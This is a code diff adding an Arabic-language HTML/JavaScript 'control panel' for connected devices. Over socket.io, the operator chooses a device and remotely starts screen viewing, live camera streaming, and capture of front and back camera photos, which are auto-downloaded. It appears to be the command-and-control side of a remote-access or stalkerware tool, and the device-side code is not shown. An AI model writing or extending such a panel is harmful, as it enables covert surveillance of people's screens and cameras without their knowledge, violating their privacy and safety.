@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>لوحة التحكم</title>
+    <style>
+        body { font-family: Arial; margin: 20px; background: #1a1a1a; color: white; }
+        .client { background: #333; padding: 15px; margin: 10px 0; border-radius: 8px; cursor: pointer; }
+        .client:hover { background: #444; }
+        .controls { display: flex; gap: 10px; margin-top: 20px; }
+        button { padding: 12px 20px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
+        button:hover { background: #0056b3; }
+        video { width: 100%; max-width: 800px; border-radius: 8px; }
+        .active { background: #28a745 !important; }
+    </style>
+</head>
+<body>
+    <h1>لوحة التحكم - العملاء المتصلين</h1>
+    <div id="clients"></div>
+    
+    <div id="controls" style="display: none;">
+        <h2>التحكم في: <span id="currentClient"></span></h2>
+        <div class="controls">
+            <button onclick="startScreenShare()">📱 مشاهدة الشاشة</button>
+            <button onclick="startCamera()">📹 كاميرا حية</button>
+            <button onclick="capturePhotos()">📸 التقاط صور</button>
+        </div>
+        <div id="stream" style="margin-top: 20px;"></div>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io();
+        let currentClient = null;
+        let streamElement;
+
+        socket.on('clients-update', (clients) => {
+            updateClients(clients);
+        });
+
+        function updateClients(clients) {
+            const container = document.getElementById('clients');
+            container.innerHTML = '';
+            clients.forEach(clientId => {
+                const div = document.createElement('div');
+                div.className = 'client';
+                div.innerHTML = `جهاز: ${clientId}`;
+                div.onclick = () => selectClient(clientId);
+                container.appendChild(div);
+            });
+        }
+
+        function selectClient(clientId) {
+            currentClient = clientId;
+            document.getElementById('currentClient').textContent = clientId;
+            document.getElementById('controls').style.display = 'block';
+            document.querySelectorAll('.client').forEach(c => c.classList.remove('active'));
+            event.target.classList.add('active');
+        }
+
+        function startScreenShare() {
+            socket.emit('screen-share', currentClient);
+        }
+
+        function startCamera() {
+            socket.emit('camera-stream', currentClient);
+        }
+
+        function capturePhotos() {
+            socket.emit('capture-photos', currentClient);
+        }
+
+        socket.on('screen-frame', (data) => {
+            if (!streamElement) {
+                streamElement = document.createElement('video');
+                streamElement.autoplay = true;
+                streamElement.muted = true;
+                document.getElementById('stream').appendChild(streamElement);
+            }
+            const blob = new Blob([data], { type: 'image/jpeg' });
+            const url = URL.createObjectURL(blob);
+            streamElement.src = url;
+        });
+
+        socket.on('camera-frame', (data) => {
+            if (!streamElement) {
+                streamElement = document.createElement('video');
+                streamElement.autoplay = true;
+                streamElement.muted = true;
+                document.getElementById('stream').appendChild(streamElement);
+            }
+            const blob = new Blob([data], { type: 'image/jpeg' });
+            const url = URL.createObjectURL(blob);
+            streamElement.src = url;
+        });
+
+        socket.on('photos-captured', (data) => {
+            const link = document.createElement('a');
+            link.href = data.front;
+            link.download = 'front.jpg';
+            link.click();
+            
+            const link2 = document.createElement('a');
+            link2.href = data.back;
+            link2.download = 'back.jpg';
+            link2.click();
+        });
+    </script>
+</body>
+</html>
